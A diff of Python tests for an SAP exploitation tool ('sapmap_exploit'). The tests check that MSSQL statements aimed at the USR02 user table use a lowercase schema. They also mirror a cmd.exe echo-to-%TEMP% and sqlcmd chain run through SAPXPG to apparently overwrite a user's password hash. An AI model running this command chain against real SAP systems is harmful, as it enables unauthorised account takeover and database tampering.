@@ -73,6 +73,23 @@ def test_sql_mssql_has_go():
     assert "GO" in stmts
 
 
+def test_sql_mssql_schema_is_lowercase():
+    """Schema qualifier must be lowercase — SAP MSSQL uses case-sensitive collation.
+
+    The dbs/mss/schema profile parameter is lowercase (e.g. 'twt').
+    Using uppercase (TWT.USR02) causes 'Invalid object name' errors.
+    The USE / -d database name stays uppercase (TWT) since it may be stored
+    uppercase and the schema name is the sensitive part.
+    """
+    stmts = sql_mssql_abap("TWT", "000", "SAPMAP00")
+    body = " ".join(stmts)
+    # Schema prefix must be lowercase
+    assert "twt.USR02" in body, "Schema prefix must be lowercase (twt.USR02)"
+    assert "TWT.USR02" not in body, "Uppercase schema TWT.USR02 must not appear"
+    # USE statement uses uppercase database name
+    assert "USE TWT" in body, "USE statement must reference uppercase database name"
+
+
 def test_sql_generators_return_list():
     generators = [
         (sql_hana, ("S4H", "000", "SAPMAP00")),
@@ -246,10 +263,16 @@ def test_caret_escape_sql_with_parens():
 
 def _get_mssql_echo_params(sid, inst, sql_stmts):
     """Collect the (ext_cmd, ext_params) pairs that _mssql_write_and_exec_win
-    would send, without actually opening a socket."""
+    would send, without actually opening a socket.
+
+    Mirrors the current _mssql_write_and_exec_win implementation:
+    - SQL file written to %TEMP%\\sapmap_mss.sql (expanded by cmd.exe at runtime)
+    - sqlcmd executed via cmd.exe /C so %TEMP% is also expanded for -i
+    - SQL Server instance: .\\<SID>_DB (SAP MSSQL named-instance convention)
+    """
     from sapmap_exploit import _cmd_caret_escape
-    workdir  = f"C:\\usr\\sap\\{sid}\\DVEBMGS{inst}\\work"
-    sql_file = f"{workdir}\\sapmap_mss.sql"
+    sql_file_env = "%TEMP%\\sapmap_mss.sql"
+    mssql_server = f".\\{sid.upper()}_DB"
     cmds = []
     first = True
     for sql in sql_stmts:
@@ -257,11 +280,12 @@ def _get_mssql_echo_params(sid, inst, sql_stmts):
         if not stripped:
             continue
         esc = _cmd_caret_escape(stripped)
-        redirect = f"> {sql_file}" if first else f">> {sql_file}"
+        redirect = f"> {sql_file_env}" if first else f">> {sql_file_env}"
         params = f"/C echo {esc} {redirect}"
         first = False
         cmds.append(("cmd.exe", params))
-    cmds.append(("sqlcmd", f"-S localhost -d {sid} -i \"{sql_file}\""))
+    cmds.append(("cmd.exe",
+                 f"/C sqlcmd -S {mssql_server} -d {sid.upper()} -i {sql_file_env}"))
     return cmds
 
 
@@ -274,7 +298,9 @@ def test_mssql_passcode_update_fits_in_params():
     it → sqlcmd gets malformed SQL → 'SAPXPG command failed'.
 
     The file-based approach puts only "cmd.exe" in EXTPROG (7 bytes) and the
-    echo command in PARAMS (255 bytes max).  Verify it fits.
+    echo/sqlcmd command in PARAMS (255 bytes max).  Verify every step fits.
+    All steps use EXTPROG="cmd.exe" (7 bytes): echo steps write to %TEMP%,
+    the final step runs sqlcmd -S .\\<SID>_DB via cmd.exe /C.
     """
     from sapmap_config import sql_mssql_abap, BCODE_HEX, PASSCODE_HEX
     sid, client, username = "TWT", "000", "SAPMAP00"
